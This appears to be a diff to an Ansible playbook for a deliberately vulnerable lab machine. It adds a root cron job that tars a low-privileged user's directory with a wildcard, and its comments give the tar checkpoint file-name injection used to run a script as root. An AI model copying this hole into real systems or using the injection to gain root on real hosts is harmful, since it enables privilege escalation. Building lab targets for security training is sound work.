@@ -118,3 +118,32 @@
         user: root
         state: present
         key: "{{ ssh_key['content'] | b64decode }}"
+
+# new ones
+
+# todo: need to test again, maybe I need to restart cron after this
+# $ echo "" > "--checkpoint-action=exec=sh exploit.sh"
+# $ echo "" > --checkpoint=1
+- name: cron creating a backup of a user directory
+  hosts: cron_calling_user_wildcard
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: Create a backup directory in the user home directory
+      ansible.builtin.file:
+        path: /home/lowpriv/backup
+        state: directory
+        mode: '0755'
+        owner: 'lowpriv'
+        group: 'lowpriv'
+    - name: create a target backup directory
+      ansible.builtin.file:
+        path: /var/spool/backups
+        state: directory
+        mode: '0755'
+        owner: 'root'
+        group: 'root'
+    - name: "create the cron tab"
+      ansible.builtin.cron:
+        name: "become root"
+        job: "cd /home/lowpriv/backup && tar -zcf /var/spool/backups/lowpriv.tar.gz *"
